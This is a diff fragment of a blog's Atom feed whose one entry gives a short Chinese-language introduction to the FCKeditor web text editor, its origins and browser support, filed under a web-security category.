+      &lt;h2 id=&quot;0x01_FCKeditor简介&quot;&gt;0x01 FCKeditor简介&lt;/h2&gt;&lt;p&gt;FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的 “FCK” 是这个编辑器的作者的名字Frederico Caldeira Knabben的缩写。FCKeditor 相容于绝大部分的网页浏览器，像是 : Internet Explorer 5.5+ (Windows)、Mozilla Firefox 1.0+、Mozilla 1.3+ 和 Netscape 7+。在未来的版本也将会加入对 Opera 的支援。&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://hackbraid.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="fckeditor" scheme="http://hackbraid.github.io/tags/fckeditor/"/>
+    
+      <category term="插件" scheme="http://hackbraid.github.io/tags/%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+</feed>
